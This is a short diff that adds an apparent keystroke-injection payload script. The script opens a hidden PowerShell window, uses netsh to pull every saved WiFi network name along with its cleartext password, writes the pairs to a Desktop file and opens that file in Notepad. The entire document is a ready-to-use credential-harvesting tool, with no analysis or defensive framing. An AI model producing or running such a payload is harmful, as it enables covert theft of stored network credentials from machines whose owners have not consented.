@@ -1,0 +1,6 @@
+REM Dump all saved WiFi SSIDs and cleartext passwords to Desktop
+REM Opens result in Notepad automatically
+GUI r
+DELAY 800
+STRING powershell -nop -w hidden -c "$o=''; (netsh wlan show profiles)|Select-String 'All User Profile'|%{$n=($_ -split ':')[1].Trim(); $p=netsh wlan show profile name=$n key=clear; $pw=($p|Select-String 'Key Content')-replace '.*:\s*',''; $o+=$n+' : '+$pw+\"`n\"}; $o|Out-File $env:USERPROFILE\Desktop\wifi_dump.txt; notepad $env:USERPROFILE\Desktop\wifi_dump.txt"
+ENTER
